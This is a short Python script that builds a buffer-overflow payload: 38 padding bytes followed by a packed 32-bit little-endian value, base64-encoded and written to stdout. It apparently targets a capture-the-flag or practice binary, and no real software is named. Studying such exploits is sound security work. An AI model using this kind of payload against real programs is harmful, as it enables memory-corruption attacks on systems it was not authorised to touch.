
import sys
import struct
import base64

buf = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
buf += struct.pack('<I', 2793221631)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
